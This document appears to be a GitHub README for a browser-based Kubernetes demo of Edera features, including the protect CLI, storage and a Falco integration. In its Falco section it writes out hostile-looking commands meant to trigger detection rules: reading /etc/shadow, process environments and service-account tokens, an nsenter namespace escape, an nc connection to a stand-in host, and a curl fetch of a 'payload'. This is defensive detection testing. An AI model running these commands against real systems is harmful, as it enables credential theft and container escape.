# Webernetes demo
This project is a port of a specific subset of the Kubernetes project to make it such that clusters can be booted up in the browser, without any backend server components. If you'd like to learn more about the **Webernetes** project, check out **[ngrok's Github repo](https://github.com/ngrok/webernetes)**.

**Preview:** <br/>
--> https://ndouglas-edera.github.io/my-webernetes-demo
<br/><br/>
**Blog post:** <br/>
--> https://coderlegion.com/24792/webernetes-kubernetes-in-your-browser
<br/>

---

| Edera Use-Case | Github | Short Description |
| :---------------- | :------: | ----: |
| Assign pods to a specific node | [Link](https://github.com/ndouglas-edera/my-webernetes-demo#assign-pods-to-a-specific-node) | Load the Edera RuntimeClass and assign it to a specific node |
| Run pods with an assigned label | [Link](https://github.com/ndouglas-edera/my-webernetes-demo#run-pods-with-an-assigned-label) | Create a workload on-the-fly with an assigned label |
| Working with namespaces | [Link](https://github.com/ndouglas-edera/my-webernetes-demo#working-with-namespaces) | Create a workload on-the-fly into an assigned namespace  |
| NVIDIA GPU passthrough |  [Link](https://github.com/ndouglas-edera/my-webernetes-demo#nvidia-gpu-passthrough-to-an-edera-zone)   | Load NVIDIA driver & run GPU-accelerated workload in zone. |
| Using storage in Kubernetes |  [Link](https://github.com/ndouglas-edera/my-webernetes-demo#using-storage-in-kubernetes)   | Edera supports native Kubernetes storage APIs. |
| Using the Edera CLI |  [Link](https://github.com/ndouglas-edera/my-webernetes-demo/tree/main#using-the-protect-cli)   | This guide teaches you how to effectively use the Edera CLI. |
| Enabling the Falco Plugin |  [Link](https://github.com/ndouglas-edera/my-webernetes-demo/tree/main#falco-on-edera)   | This guide shows you how to configure the Edera plugin for Falco. |
| Understand the Filesystem |  [Link](https://github.com/ndouglas-edera/my-webernetes-demo/tree/main#understanding-the-filesystem)   | This guide shows you how to interact with the virtual filesystem. |

---

## virtual read-only filesystem

```
~
.
├── edera/
│   ├── nginx-deployment.yaml
│   ├── pod-nginx.yaml
│   └── runtimeclass-edera.yaml
├── etc/
│   └── falco/
│       ├── config.d/
│       │   └── falco-edera-config.yaml
│       └── rules.d/
│           └── falco-edera-rules.yaml
└── storage/
    ├── csi/
    │   ├── csi-block-deployment.yaml
    │   ├── csi-block-pvc.yaml
    │   └── format-block-device.yaml
    └── ...
```

## Assign pods to a specific node

You can list the files in the demo terminal and even simulate reading a manifest file:

```
ls -la
```
```
cat edera/runtimeclass-edera.yaml
```

Create a ```RuntimeClass``` called ```edera``` and label a specific node with the runtime context.
```
kubectl apply -f edera/runtimeclass-edera.yaml
```
```
kubectl get runtimeclass
```
```
kubectl label node node-3 runtime=edera
```
Verify the **[Edera RuntimeClass](https://docs.edera.dev/guides/validate/#verify-the-edera-runtimeclass)**:
```
kubectl get nodes -l runtime=edera
```
```
kubectl describe node node-3
```

<img width="1507" height="765" alt="Screenshot 2026-09-07 at 00 28 07" src="https://github.com/user-attachments/assets/22027295-e0bb-46eb-8038-af5aeb141a05" />
<br/>

## Run pods with an assigned label

Run a pod with a specific label ```env=prod```
```
kubectl run ubuntu --image=ubuntu:latest --labels="env=prod"
```

Confirm the labels are assigned to the pod
```
kubectl get pods --show-labels
```

<img width="1507" height="765" alt="Screenshot 2026-09-07 at 00 34 40" src="https://github.com/user-attachments/assets/01fdd9a8-0056-4f2b-8bab-8204dd19f63c" />
<br/>

## Working with namespaces

Read one of the sample manifests
```
cat edera/pod-hardened-vessel.yaml
```

Try applying it (it should **fail**):
```
kubectl apply -f edera/pod-hardened-vessel.yaml
```

Create your own custom ```edera``` namespace:
```
kubectl create namespace edera
```

Try again (this time it should **work**):
```
kubectl apply -f edera/pod-hardened-vessel.yaml
```

Check what namespaces exist:
```
kubectl get namespaces
```

Confirm the pods are actually running:
```
kubectl get pods -A
```

Run a new workload inside the ```edera``` namespace:
```
kubectl run ubuntu --image=ubuntu:latest --labels="env=prod" -n edera
```

<img width="1507" height="765" alt="Screenshot 2026-09-07 at 00 44 51" src="https://github.com/user-attachments/assets/ceab8c0e-8229-4b6a-b52d-fcc9c60f14d7" />
<br/>

## NVIDIA GPU passthrough to an Edera zone
This guide, based on our **[official docs](https://docs.edera.dev/guides/gpu/nvidia-passthrough/)** shows how to passthrough an NVIDIA GPU to an Edera zone using ```protect```, load the NVIDIA driver, and run a GPU-accelerated workload inside the zone.
<br/><br/>
Supported GPUs, like the ```Tesla```, should show up in the output of ```lspci```:
```
sudo lspci -Dknn -d ::03xx
```

If you made changes to ```/var/lib/edera/protect/daemon.toml```, you need to restart the Edera daemon:
```
sudo systemctl restart protect-daemon
```

If you changed the kernel variant configs, confirm the variant is resolvable with:
```
sudo protect image list-kernel-variants
```

You can reboot the system or (re-)load the VFIO kernel modules:
```
sudo modprobe -r vfio_pci
```
```
sudo modprobe vfio_pci
```
Confirm that the GPUs are successfully bound to the ```vfio-pci``` driver:
```
sudo lspci -Dknn -d ::03xx
```
Launch a ```zone``` with NVIDIA GPU passthrough
```
sudo protect zone launch --name zone-gpu --device gpu0 --kernel-verbose --target-memory 2048 --resource-adjustment-policy static --kernel-variant nvidia --pull-overwrite-cache
```
Check that the zone launched successfully:
```
sudo protect zone list
```
Confirm the NVIDIA driver is loaded by checking the zone logs:
```
sudo protect zone logs zone-gpu
```

<img width="1506" height="765" alt="Screenshot 2026-09-03 at 18 06 22" src="https://github.com/user-attachments/assets/fce4f293-d2f9-47d7-847d-e7741c3f3f20" />
<br/>

Launch a workload with the NVIDIA GPU:
```
sudo protect workload launch --name workload-gpu --zone zone-gpu --privileged nvidia/cuda:13.3.0-devel-ubuntu26.04 -- /bin/bash
```
Check it’s running:
```
sudo protect workload list
```
Verify that the GPU is visible to the workload and has the ```nvidia``` driver loaded:
```
sudo protect workload exec workload-gpu -- /bin/bash -c 'DEBIAN_FRONTEND=noninteractive && apt-get update && apt-get install -y pciutils && lspci -Dknn'
```
Verify GPU access via ```nvidia-smi```:
```
sudo protect workload exec workload-gpu nvidia-smi
```

<img width="1506" height="765" alt="Screenshot 2026-09-03 at 18 08 04" src="https://github.com/user-attachments/assets/4d816b5f-f104-414f-a066-623973cce37c" />
<br/>

Success!! We’ve configured the GPU and have launched a workload in an isolated zone.
<br/><br/>
Cleanup commands:
```
sudo protect workload destroy workload-gpu
```
```
sudo protect zone destroy zone-gpu
```

## Using storage in Kubernetes

Edera supports native Kubernetes storage APIs, as stated in the **[official docs](https://docs.edera.dev/guides/storage/kubernetes-block-devices)**. <br/>
You can attach persistent storage to pods using standard ```PersistentVolumes``` and ```PersistentVolumeClaims```.

### Step 1: CSI-provisioned block volume:
First, create the ```PersistentVolumeClaims```:
```
kubectl apply -f storage/csi/csi-block-pvc.yaml
```

Create the formatter ```Job```:
```
kubectl apply -f storage/csi/format-block-device.yaml
```

Wait for formatting to complete:
```
kubectl wait --for=condition=complete job/format-block-device --timeout=120s
```
Then deploy the Edera workload:
```
kubectl apply -f storage/csi/csi-block-deployment.yaml
```
Useful verification:
```
kubectl get pvc
```
```
kubectl get pv
```
```
kubectl get jobs
```
```
kubectl get pods
```
<img width="1507" height="765" alt="Screenshot 2026-09-06 at 22 37 22" src="https://github.com/user-attachments/assets/c4fe1213-29a1-4264-b6cf-cb8fe643cf6d" />
<br/>

And:
```
kubectl describe pvc my-app-data
```
```
kubectl describe job format-block-device
```

<img width="1507" height="765" alt="Screenshot 2026-09-06 at 22 39 35" src="https://github.com/user-attachments/assets/1e00caa3-b036-4c43-b9a3-6776dd6ee5f3" />
<br/>

### Step 2: Filesystem-mounted PVC:
Create the ```PersistentVolumeClaims```:
```
kubectl apply -f storage/filesystem/filesystem-pvc.yaml
```
Then deploy the workload:
```
kubectl apply -f storage/filesystem/filesystem-deployment.yaml
```
Verify:
```
kubectl get pvc
```
```
kubectl get pv
```
```
kubectl get pods
```
You can also inspect the deployment:
```
kubectl describe deployment my-app
```

<img width="1507" height="765" alt="Screenshot 2026-09-06 at 22 57 22" src="https://github.com/user-attachments/assets/6628796e-2489-4ecf-9a3e-12c8fd9a7fea" />
<br/>

### Step 3: Local NVMe block device:
Create the local ```PersistentVolume```:
```
kubectl apply -f storage/local-nvme/local-nvme-pv.yaml
```
Create the ```PersistentVolumeClaims```:
```
kubectl apply -f storage/local-nvme/local-nvme-pvc.yaml
```
Then deploy the Edera workload:
```
kubectl apply -f storage/local-nvme/local-nvme-deployment.yaml
```
Verify:
```
kubectl get pv
```
```
kubectl get pvc
```
```
kubectl get pods -o wide
```
And:
```
kubectl describe pv local-raw-pv
```
```
kubectl describe pvc local-block-pvc
```

<img width="1507" height="765" alt="Screenshot 2026-09-06 at 22 59 33" src="https://github.com/user-attachments/assets/99db7b26-e5d9-4c46-a858-8d953553d79e" />
<br/>

## Using the Protect CLI

Launch a basic zone
```
protect zone launch --name my-test-zone --wait
```

List all zones in table format
```
protect zone list
```

List zones in JSON format for automation
```
protect zone list my-test-zone --output json
```

Watch zone changes in real-time
```
protect zone watch
```
Get detailed info about a specific zone
```
protect zone list my-test-zone --output json-pretty
```

<img width="1507" height="765" alt="Screenshot 2026-09-08 at 09 33 15" src="https://github.com/user-attachments/assets/6bb8bf85-060e-47ca-aecb-3a40952c6a02" />
<br/>

Launch a simple workload in an existing zone
```
protect workload launch --zone my-test-zone --name web-server nginx:latest
```
Launch with custom command and wait for it to start
```
protect workload launch --zone my-test-zone --name debug-shell --wait ubuntu:latest /bin/bash
```
Run a basic command in a workload (works with minimal containers)
```
protect workload exec web-server /bin/sh -c "ls /"
```
Run system commands in full containers
```
protect workload exec debug-shell ps aux
```
Get an interactive shell
```
protect workload exec --tty debug-shell /bin/bash
```
List all workloads
```
protect workload list
```
Stop a workload
```
protect workload stop web-server
```
Start a stopped workload
```
protect workload start web-server
```

<img width="1507" height="765" alt="Screenshot 2026-09-08 at 09 36 21" src="https://github.com/user-attachments/assets/b8a2b8dd-d70b-4d03-88f8-efc61d5b9a7d" />
<br/>

Destroy a workload permanently
```
protect workload destroy web-server --wait
```
View all cached images
```
protect image list
```
Get detailed JSON output
```
protect image list --output json-pretty
```

<img width="1507" height="765" alt="Screenshot 2026-09-08 at 10 05 03" src="https://github.com/user-attachments/assets/75edeb83-d093-4e27-b04b-dbcba368c5ef" />
<br/>

Kernel variants are alternate zone kernel images with different features or extra capabilities or drivers.<br/>
The daemon resolves from its ```[zone.kernel-variants]``` config.
```
protect image list-kernel-variants
```
Pull an image into the cache
```
protect image pull nginx:latest
```
Force overwrite existing cached image
```
protect image pull --overwrite-cache redis:alpine
```
First, list images to get the digest
```
protect image list --output table
```
Remove the image by ```SHA256``` digest:
```
protect image remove sha256:abc123...def456
```
Check if the Edera daemon is running
```
protect host status
```

<img width="1507" height="765" alt="Screenshot 2026-09-08 at 10 08 02" src="https://github.com/user-attachments/assets/00b543d4-6478-4918-99ad-75188ca99646" />
<br/>

View system topology
```
protect host cpu-topology
```
Viewing logs in real-time
```
protect zone logs my-test-zone --follow
```
View hypervisor debug information
```
protect host hv-debug-info
```
Using selectors for filtering resources by state:
```
protect zone list --selector status.state=failed
```
List only running workloads
```
protect workload list --selector status.state=running
```

<img width="1507" height="765" alt="Screenshot 2026-09-08 at 10 09 27" src="https://github.com/user-attachments/assets/dd3c476f-fc7f-4b63-9564-d880979a1ff8" />

Pretty-print the JSON output for the running pod:
```
protect workload list edera-protect-pod --output json-pretty
```

## Falco on Edera
The **[official Falco docs](https://docs.edera.dev/guides/observability/falco-integration/)** for Edera shows you how to configure the **Edera plugin for Falco** and start monitoring zone activity with custom security rules.
<br/><br/>
Configure the Edera Falco plugin
```
sudo cat /etc/falco/config.d/falco-edera-config.yaml
```
Install the **10 custom** Edera detection rules
```
sudo cat /etc/falco/rules.d/falco-edera-rules.yaml
```
Restart Falco
```
sudo systemctl restart falco
```
Verify the Edera plugin
```
sudo falco -o "log_level=debug"
```
Launch a monitored zone
```
protect zone launch --name falco-zone
```
```
protect workload launch --zone falco-zone --name llm-app qwen3:latest
```
Generate an event
```
protect workload exec llm-app /bin/sh
```

**[Detect credential harvesting via procfs](https://docs.edera.dev/guides/observability/falco-integration/#detect-credential-harvesting-via-procfs)**:
```
protect workload exec llm-app cat /proc/1/environ
```
Observe the Falco event
```
kubectl logs -n falco -l app.kubernetes.io/name=falco -f
```

<img width="1507" height="765" alt="Screenshot 2026-09-08 at 11 54 13" src="https://github.com/user-attachments/assets/483ee7c9-7c04-41ab-8326-96b18d50b5b1" />

| Command | Current rule | Detection? |
| :---------------- | :------: | :------: |
| ```cat /proc/1/environ``` | Edera Proc Environ Read | ✅ |
| ```/bin/sh``` | None | ❌ |
| ```nc ...``` | Edera Reverse Shell Tool | ✅ |
| ```nsenter ...``` | Edera Namespace Escape Attempt | ✅ |
| ```cat /etc/shadow``` | Edera Sensitive File Read | ✅ |
| ```cat /etc/kubernetes/...``` | Edera Sensitive File Read | ✅ |
| ```curl ...``` | Edera Outbound Connection | ✅ |


**[Detect sensitive file reads](https://docs.edera.dev/guides/observability/falco-integration/#detect-sensitive-file-reads)**
```
protect workload exec llm-app cat /etc/shadow
```

**[Detect namespace escape attempts](https://docs.edera.dev/guides/observability/falco-integration/#detect-namespace-escape-attempts)**
```
protect workload exec llm-app nsenter -t 1 -m -u -i -n -p
```

**[Detect reverse shells and suspicious network tools](https://docs.edera.dev/guides/observability/falco-integration/#detect-reverse-shells-and-suspicious-network-tools)**
```
protect workload exec llm-app nc 203.0.113.10 4444
```

**[Detect outbound network connections](https://docs.edera.dev/guides/observability/falco-integration/#detect-outbound-network-connections)**
```
protect workload exec llm-app curl https://example.com/payload
```

**Edera privilege escalation**
```
protect workload exec llm-app sudo id
```

**Edera ServiceAccount access** (and the broader **sensitive-read** rule where applicable)
```
protect workload exec llm-app cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Edera sensitive file write** + **Edera shell command execution**
```
protect workload exec llm-app /bin/sh -c "echo demo > /etc/demo.conf"
```

The accumulated detections continue to appear in the logs:
```
kubectl logs -n falco -l app.kubernetes.io/name=falco -f
```

## Understanding the filesystem

Recursive ```ls```. Adding the ```-R``` (**recursive**) flag to ```ls -la``` lists all files, permissions, and **hidden dotfiles** for the current directory and every subdirectory beneath it.
```
ls -laR
```
Lists all **non-hidden files** and directories in your current directory, recursively expanding every subdirectory.
```
ls -R
```
Lists all files and subdirectories. **Includes hidden dotfiles** (```.gitignore```, ```.env```, etc.) and hidden directories recursively starting from your current directory.
```
ls -aR
```
Performs a long format recursive list of every file, hidden file, and folder inside ```/etc```, which is where system-wide configs live on Unix-like OS.
```
ls -laR /etc
```

It recursively prints each directory and its contents, with the ```-l``` form showing the simulated permissions, ownership, size, and timestamps.

### Visual tree
```
tree -a
```
or again, a specific directory:
```
tree -a /etc
```
The ```-a``` flag is honoured so hidden entries will be included if/when they're present in the virtual filesystem.
<br/><br/>
Whereas, the ```find``` command produces the clean relative paths:
```
find . -type f
```
